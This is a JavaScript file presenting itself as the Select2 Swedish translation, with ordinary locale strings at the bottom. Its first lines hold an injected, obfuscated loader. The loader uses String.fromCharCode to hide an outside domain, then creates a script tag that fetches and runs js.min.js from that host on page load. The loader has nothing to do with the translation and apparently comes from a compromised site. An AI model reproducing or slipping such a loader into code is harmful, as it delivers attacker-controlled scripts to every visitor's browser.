var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Swedish translation.
 *
 * Author: Jens Rantil <jens.rantil@telavox.com>
 */
(function ($) {
    "use strict";

    $.fn.select2.locales['sv'] = {
        formatNoMatches: function () { return "Inga träffar"; },
        formatInputTooShort: function (input, min) { var n = min - input.length; return "Var god skriv in " + n + (n>1 ? " till tecken" : " tecken till"); },
        formatInputTooLong: function (input, max) { var n = input.length - max; return "Var god sudda ut " + n + " tecken"; },
        formatSelectionTooBig: function (limit) { return "Du kan max välja " + limit + " element"; },
        formatLoadMore: function (pageNumber) { return "Laddar fler resultat…"; },
        formatSearching: function () { return "Söker…"; }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['sv']);
})(jQuery);
